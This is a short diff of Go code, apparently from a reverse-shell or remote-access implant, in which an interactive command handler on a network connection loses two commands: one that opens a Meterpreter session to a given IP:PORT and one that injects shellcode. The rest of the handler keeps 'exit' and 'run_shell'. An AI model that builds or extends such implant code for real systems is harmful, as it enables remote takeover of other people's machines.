@@ -39,21 +39,6 @@ func InteractiveShell(conn net.Conn) {
 		if len(command) > 1 {
 			argv := strings.Split(command, " ")
 			switch argv[0] {
-			case "meterpreter":
-				if len(argv) > 2 {
-					transport := argv[1]
-					address := argv[2]
-					ok, err := meterpreter.Meterpreter(transport, address)
-					if !ok {
-						conn.Write([]byte(err.Error() + "\n"))
-					}
-				} else {
-					conn.Write([]byte("Usage: meterpreter [tcp|http|https] IP:PORT\n"))
-				}
-			case "inject":
-				if len(argv) > 1 {
-					shell.InjectShellcode(argv[1])
-				}
 			case "exit":
 				exit = true
 			case "run_shell":
